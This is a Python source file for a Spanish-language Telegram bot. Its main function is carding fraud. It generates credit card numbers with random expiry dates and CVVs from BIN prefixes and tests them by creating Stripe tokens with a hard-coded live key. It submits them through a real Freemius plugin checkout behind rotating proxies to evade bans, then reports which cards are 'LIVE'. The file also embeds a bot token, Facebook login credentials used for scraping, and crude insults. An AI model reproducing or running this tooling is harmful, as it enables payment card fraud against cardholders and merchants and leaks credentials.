from telegram.ext import Updater, MessageHandler, Filters
import requests as r, bs4, urllib.parse as u, re, fast_luhn as fl, sqlite3, os
from random import choice, randint
from time import sleep
import telegram.message
import logging
from datetime import datetime


updater = Updater(token='1355792455:AAH2w_UWj_iVExnYNeqYqTEAvLkhY_-eT0g', use_context=True)

dispatcher = updater.dispatcher

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                     level=logging.INFO)
urltoken = "https://api.stripe.com/v1/tokens"
respuestacheck = "https://checkout.freemius.com/action/service/subscribe/"

ccList = []
proxy = ''

RAIZ = os.path.abspath(os.path.dirname(__file__))
DB_FILE = os.path.join(RAIZ, 'ccdb.db')

#Internal Functions

def ccGen(extrap, month, year, cvv):
    extrap = extrap[:-1]
    genlist = []
    for i in range(10):
        def repl_fun(match):
            return str(randint(0,9))
        generated = re.sub('x', repl_fun, extrap)
        generated = fl.complete(generated)
        if generated[0] == '4' and len(generated) != 16 or generated[0] == '5' and len(generated) != 16:
            return 'Error, el bin no coincide con la longitud'
        elif generated[0] == '3' and len(generated) != 15:
            return 'Error, el bin no coincide con la longitud'

        if month == 'rnd':
            monthg = str(randint(1,12))
            if len(monthg) == 1:
                monthg = '0'+monthg
        else:
            monthg = month

        if year == 'rnd':
            yearnow = int(datetime.now().strftime('%y'))
            monthnow = int(datetime.now().strftime('%y'))
            yearg = str(randint(yearnow if int(monthg) >= monthnow else yearnow+1, 26))
            yearg = '20'+yearg
        else:
            yearg = year if len(year) == 4 else '20'+year

        if cvv == 'rnd':
            if len(generated) == 16:
                cvvg = str(randint(0, 999))
            elif len(generated) == 15:
                cvvg = str(randint(0, 9999))
            if len(cvvg) == 2:
                cvvg = '0'+cvvg
            if len(cvvg) == 1:
                cvvg = '00'+cvvg
            if len(cvvg) == 3 and len(generated) == 15:
                cvvg = '0'+cvvg
        else:
            cvvg = cvv


        genlist.append(str(generated+'|'+monthg+'|'+yearg+'|'+cvvg))
    return '\n'.join(genlist)

def ccCheck(ccs):
    global ccList
    for i in range(len(ccs)):
        cc, mm, yy, cvv = ccs[i][0], ccs[i][1], ccs[i][2], ccs[i][3]
        tokenData = {
        "time_on_page": "96394",
        "pasted_fields": "email,number",
        "guid": "NA",
        "muid": "NA",
        "sid": "NA",
        "key": "pk_live_eP8c8rXxkvgPXGLfBw2wjX4p",
        "payment_user_agent": "stripe.js/6c4e062",
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[address_zip]": "10010",
        "card[exp_month]": mm,
        "card[exp_year]": yy
        }
        peticiontoken = r.post(urltoken, data=tokenData)

        jstoken = peticiontoken.json()
        try:
            tokenxd = (jstoken['id'])
        except:
            mamarrexd = peticiontoken.text
            if 'decline_code": "generic_decline",' in mamarrexd:
                tokenxd = "pm_1HQSvTBJw93109F8Omyt149v"
            else:
                print(peticiontoken.text)
        datacheck = {
            "auto_install": "false",
        "billing_cycle": "annual",
        "cart_id": "239352",
        "country_code": "MX",
        "failed_zipcode_purchases_count": "0",
        "http_referer": "https://checkout.freemius.com/?mode=dialog&guid=3cf24bf3-dbdb-aaa0-5501-35fc59ca1021&plugin_id=3767&plan_id=6056&public_key=pk_c334eb1ae413deac41e30bf00b9dc&licenses=1&billing_cycle=annual#!#https:%2F%2Foceanwp.org%2Fcore-extensions-bundle%2F",
        "is_affiliation_enabled": "true",
        "is_marketing_allowed": "true",
        "is_sandbox": "false",
        "mode": "dialog",
        "payment_method": "cc",
        "payment_token": tokenxd,
        "plugin_id": "3767",
        "plugin_public_key": "pk_c334eb1ae413deac41e30bf00b9dc",
        "pricing_id": "5262",
        "update_license": "false",
        "user_email": "jose"+str(randint(1,99999))+"gmail.com",
        "user_firstname": "Alejo",
        "user_lastname": "Perez"
        }
        
        proxylocal=choice(proxy)

        proxies = {

            'https':'https://'+proxylocal
        }
        
        peticionchk = r.post(respuestacheck, data=datacheck, stream=True, proxies=proxies).text
        #print(f'{ccs[i][0]}|{ccs[i][1]}|{ccs[i][2]}|{ccs[i][3]} \n\n {peticionchk}')
        if "The card's security code is incorrect." in peticionchk:
            ccList.append(f'\N{check mark} LIVE CCN => {ccs[i][0]}|{ccs[i][1]}|{ccs[i][2]}|{ccs[i][3]}')
        elif "generic_decline" in peticionchk:
           ccList.append(f'\N{cross mark} DEAD => {ccs[i][0]}|{ccs[i][1]}|{ccs[i][2]}|{ccs[i][3]}')
        elif "'success': True" in peticionchk:
            ccList.append(f'\N{check mark} LIVE CC => {ccs[i][0]}|{ccs[i][1]}|{ccs[i][2]}|{ccs[i][3]}')
        elif 'banned' in peticionchk:
            print('Proxy Baneado: '+proxylocal)
        else:
            ccList.append(f' \N{cross mark} DEAD => {ccs[i][0]}|{ccs[i][1]}|{ccs[i][2]}|{ccs[i][3]}')
        sleep(3)
    return '\n'.join(ccList)


def binCheck(ccbin):
    #key = choice(['ARu7lxY0tHOAR02ow5crggaOclThc1Nq', 'LF1N0CwS2leyPeL4n1idomUjUWFaErzi'])
    binlist = 'https://lookup.binlist.net/'
    getPage = r.get(binlist+str(ccbin)).json()
    getScheme = getPage['scheme'].lower().title() if bool(getPage['scheme'].lower().title()) is not False else '-'
    getType = getPage['type'].lower().title() if bool(getPage['type'].lower().title()) is not False else '-'
    getCountry = getPage['country']['name'].lower().title() if bool(getPage['country']['name'].lower().title()) is not False else '-'
    getBank = getPage['bank']['name'].lower().title() if bool(getPage['bank']['name'].lower().title()) is not False else '-'
    return f'Bin: {bincc} \nBrand: {getScheme} \nTipo: {getType} \nPaís: {getCountry} \nBanco: {getBank}'



def HTMLParser(url):
    #print(url)
    USERNAME = 'joseval99dez@gmail.com'
    PASSWORD = 'Vazbelm007!'
    PROTECTED_URL = url

    def login(session, email, password):

        response = session.post('https://m.facebook.com/login.php', data={
            'email': email,
            'pass': password
        }, allow_redirects=False)

        return response.cookies
    session = r.session()
    cookies = login(session, USERNAME, PASSWORD)
    response = session.get(PROTECTED_URL, cookies=cookies, allow_redirects=False)
    UrlHTML = bs4.BeautifulSoup(response.text, 'lxml')
    #print(UrlHTML)
    videoUrl = str([i for i in UrlHTML.findAll('a', href=True) if 'mp4' in str(i)][0]).split(';')[0].split('src=')[1]
    #print(UrlHTML)
    return 'Good|'+u.unquote(str(videoUrl))

def VideoUrl(url):
    try:
        if 'www' in url:
            url = url.replace('www', 'm')
            # print(url)
        elif '//f' in url:
            url = url.replace('//f', '//m.f')
            # print(url)
        elif 'm.' in url:
            pass
        else:
            return 'Bad|Tu link culero no sirve'
        return HTMLParser(url)
    except Exception as e:
        return 'Bad|Tu video no me sirve pa, una disculpa '+str(e)

def binCarbon(bincc):
    #print(bincc)
    carbonraw = r.get('http://c602fda30e3278320.temporary.link/carbon.php?extra='+bincc).text
    carbonHTML = bs4.BeautifulSoup(carbonraw, 'lxml').find('p').text.split()
    if 'No' in carbonHTML:
        return 'No hay de esas bro' 
    else:  
        return '\n'.join(carbonHTML) 


def proxyList():
    gitinfo = 'https://api.github.com/gists/c5e07f88e03eaebdeba61b0a40fed46d'
    git = r.get(gitinfo)
    proxys = git.json().get('files').get('proxys').get('content')
    '''while True:
        try:
            proxyraw = 'https://api.proxyflow.io/v1/proxy/random?token=526f3f87daee647186f3ec5e&ssl=true&protocol=http'
            proxyget = r.get(proxyraw).json()
            ip = proxyget['ip']+':'+str(proxyget['port'])
            proxies = {
            
                'https':'https://'+ip
        
            }
            test = r.get('https://google.com', proxies=proxies, timeout=10).status_code
            if test == 200:
                functionalProxy.append(ip)
                if len(functionalProxy) == 5:
                    print(functionalProxy)
                    return functionalProxy
            else:
                pass
        except:
            pass
'''
    return proxys.split('\n')

# End Internal Functions

# Bot Functions

def FBVideo(update, context):
    command = update.effective_message.text.split()[0]
    if command != '@MexaBoi_bot':
        return
    else:
        url = update.effective_message.text.split()[1]
        urlObtained = VideoUrl(url).split('|')
        #print(urlObtained[0])
        if urlObtained[0] == 'Good':
            context.bot.send_video(chat_id=update.effective_chat.id, reply_to_message_id=update.effective_message.message_id, supports_streaming=True, video=urlObtained[1])
        else:
            context.bot.send_message(chat_id=update.effective_chat.id, reply_to_message_id=update.effective_message.message_id, text=urlObtained[1])

def binGet(update, context):
    command = update.effective_message.text.split()[0]
    print('Comando: ' + command)
    if command != '!bin':
        return
    else:
        ccbinr = re.findall('((3|4|5)\d{5})', update.effective_message.text.split()[1])[0]
        print(ccbinr)
        ccbinr = ccbinr[0]
        print(ccbinr)
        context.bot.send_message(chat_id=update.effective_chat.id, reply_to_message_id=update.effective_message.message_id, text=binCheck(ccbinr),)

def binGen(update, context):
    command = update.effective_message.text.split()[0]
    #print(command)
    if command != '!gen':
        return
    else:
        try:
            full = update.effective_message.text.split()[1]
            full = (re.findall('(((5|4)\d{5}(x|\d){10}|3\d{5}(x|\d){9}).(\d{2}|rnd).(\d{2,4}|rnd).(\d{3,4}|rnd))', full)[0])[0]
            full = full.split('|')
            extrap, month, year, cvv = full[0], full[1], full[2], full[3]
            context.bot.send_message(chat_id=update.effective_chat.id, reply_to_message_id=update.effective_message.message_id, text=ccGen(extrap, month, year, cvv),)
        except:
            context.bot.send_message(chat_id=update.effective_chat.id, reply_to_message_id=update.effective_message.message_id, text='Tu extra no me sirve, bro')

def ccChk(update, context):
    status = r.get('https://gist.githubusercontent.com/ErK03K/db155b66a737e18222cb7163a5b306b6/raw/4a0dd12bf709d0b73b7e3583f4848653a5976eeb/open-close').text
    global proxy
    functionalProxy = []
    command = update.effective_message.text.split()[0]
    proxy = proxyList()
    #print(command)
    if command != '!chk':
        return
    else:
        if 'close' in status:
            context.bot.send_message(chat_id=update.effective_chat.id, reply_to_message_id=update.effective_message.message_id, text='Checker cerrado, vuelva pronto')
        else:
            try:
                global ccList
                ccList = []
                full = update.effective_message.text.split()[1]
                full = (re.findall('(((5|4)\d{5}(x|\d){10}|3\d{5}(x|\d){9}).(\d{2}|rnd).(\d{2,4}|rnd).(\d{3,4}|rnd))', full)[0])[0]
                full = full.split('|')
                extrap, month, year, cvv = full[0], full[1], full[2], full[3]
                context.bot.send_message(chat_id=update.effective_chat.id, reply_to_message_id=update.effective_message.message_id, text=ccCheck([i.split('|') for i in ccGen(extrap, month, year, cvv).split('\n')]))
            except Exception as e:
                context.bot.send_message(chat_id=update.effective_chat.id, reply_to_message_id=update.effective_message.message_id, text='Error '+str(e))

def carbonGet(update, context):
    command = update.effective_message.text.split()[0]
    #print(command)
    if command != '!carbon':
        return
    else:
        data = update.effective_message.text.split()
        #print(f'{len(data[1])}')
        try:
            if data[0] == '!carbon' and bool(re.match('(3|4|5)\d{5,14}', data[1])):
                try:
                    context.bot.send_message(chat_id=update.effective_chat.id, reply_to_message_id=update.effective_message.message_id, text=binCarbon(data[1]))
                except Exception as e:
                    if 'empty' in str(e):
                        context.bot.send_message(chat_id=update.effective_chat.id, reply_to_message_id=update.effective_message.message_id, text='No hay desos bro')
                    else:
                        context.bot.send_message(chat_id=update.effective_chat.id, reply_to_message_id=update.effective_message.message_id, text='Diganle al pendejo que me creo que hubo este error: '+str(e))
            elif bool(re.match('(3|4|5)\d{5,14}', data[1])) == False:
                context.bot.send_message(chat_id=update.effective_chat.id, reply_to_message_id=update.effective_message.message_id, text='Bin no funcional')
        except:
            context.bot.send_message(chat_id=update.effective_chat.id, reply_to_message_id=update.effective_message.message_id, text='Hubo un error')

def mentadaDeMadre(update, context):
    context.bot.send_message(chat_id=update.effective_chat.id, reply_to_message_id=update.effective_message.message_id, text='Chinga la tuya, joto')

#End Bot Functions

# Message Handlers

fbGetHandler = MessageHandler(Filters.regex(r'@MexaBoi_bot https://'), FBVideo)
binHandler = MessageHandler(Filters.regex(r'!bin'), binGet)
ccGenHandler = MessageHandler(Filters.regex(r'!gen'), binGen)
ccChkHandler = MessageHandler(Filters.regex(r'!chk'), ccChk)
carbonHandler = MessageHandler(Filters.regex(r'!carbon'), carbonGet)
mentadaHandler = MessageHandler(Filters.regex(re.compile(r'chinga tu madre @MexaBoi_bot', re.IGNORECASE)), mentadaDeMadre)
mentadaHandler2 = MessageHandler(Filters.regex(re.compile(r'@MexaBoi_bot chinga tu madre', re.IGNORECASE)), mentadaDeMadre)
# End Message Handlers

# Dispatchers, add handler

dispatcher.add_handler(fbGetHandler)
dispatcher.add_handler(binHandler)
dispatcher.add_handler(ccGenHandler)
dispatcher.add_handler(ccChkHandler)
dispatcher.add_handler(carbonHandler)
dispatcher.add_handler(mentadaHandler)
dispatcher.add_handler(mentadaHandler2)


# End Dispatchers, add handler

updater.start_polling()
